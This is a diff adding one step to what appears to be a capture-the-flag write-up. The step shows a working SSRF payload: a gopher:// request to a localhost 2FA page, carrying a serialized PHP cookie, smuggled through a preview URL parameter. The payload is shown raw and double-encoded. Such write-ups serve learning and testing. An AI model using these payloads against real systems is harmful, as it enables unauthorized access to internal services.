@@ -203,3 +203,19 @@ Content-Type: text/html; charset=UTF-8
 
 ![redirect to 2fa](images/22-login-redir-2fa.png)
 
+23. I built a **GET** request with cookies to access `/2fa.php`. 🤖
+```
+gopher://127.0.0.1:80/_GET /management/2fa.php HTTP/1.1
+Host: 127.0.0.1
+Cookie: auth_token=O%3A9%3A%22AuthToken%22%3A1%3A%7Bs%3A9%3A%22validated%22%3Bb%3A0%3B%7D; PHPSESSID=u8todb9p9lq3r4jnup573sk6pf;
+
+```
+
+![2fa page req](images/23-redir-to-2fa.png)
+
+```
+http://$TARGET/preview.php?url=gopher://127.0.0.1:80/_GET%2520/management/2fa.php%2520HTTP/1.1%250D%250AHost:%2520127.0.0.1%250D%250ACookie:%2520auth_token=O%25253A9%25253A%252522AuthToken%252522%25253A1%25253A%25257Bs%25253A9%25253A%252522validated%252522%25253Bb%25253A0%25253B%25257D;%2520PHPSESSID=u8todb9p9lq3r4jnup573sk6pf;%250D%250A
+```
+
+![2fa page](images/23-2fa.png)
+
